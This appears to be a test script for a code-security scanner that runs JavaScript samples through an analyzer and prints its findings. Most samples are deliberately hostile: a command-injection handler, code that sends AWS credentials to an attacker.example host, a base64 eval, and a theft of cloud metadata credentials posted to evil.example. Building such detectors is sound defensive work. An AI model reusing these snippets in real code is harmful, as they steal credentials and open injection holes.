import sys
sys.stdout.reconfigure(encoding="utf-8")
from codeguard.ctx import Ctx
from codeguard import jsfe, textscan, pipeline


def show(ctx):
    for e in ctx.events:
        ex = {k: v for k, v in e.extra.items() if k in ("witness", "score", "conf")}
        print(f"  L{e.line:<3} {e.cap:<12} {e.name:<22.22} t={str(e.target)!r:.48} tl={sorted(e.tlabels)} pl={sorted(e.plabels)} fl={sorted(e.flags)} host={e.hostc} pc={sorted(e.pathc)} x{e.mult} {ex or ''}")
    if ctx.notes:
        print("  NOTES", ctx.notes)


def js(text, label=""):
    ctx = Ctx()
    ok = jsfe.analyze_js_text(text, ctx)
    textscan.finalize_texts(ctx)
    print(label or repr(text)[:60], "parsed=", ok)
    show(ctx)
    r = pipeline.scan(text)
    print("  ->", r["verdict"], r["risk_score"], r["categories"], r["code_language"])
    print("  ", r["reason"][:300])
    print()
    return ctx


if __name__ == "__main__":
    js('''
const { exec } = require('child_process');
const http = require("http");
http.createServer((req, res) => {
  const name = req.query.name;
  exec(`ls ${name}`, (err, out) => { res.end(out); });
});
''')
    js('''
const fs = require('fs');
const axios = require('axios');
const creds = fs.readFileSync(process.env.HOME + '/.aws/credentials', 'utf8');
axios.post('https://hooks.attacker.example/collect', { data: creds });
''')
    js('''
const payload = Buffer.from('Y29uc29sZS5sb2coMSk=', 'base64').toString();
eval(payload);
''')
    js('''
async function steal() {
  const r = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');
  const t = await r.text();
  await fetch('https://evil.example/c', {method: 'POST', body: t});
}
steal();
''')
    js('''
function render(name) { return `<p>${name}</p>`; }
module.exports = { render };
''')
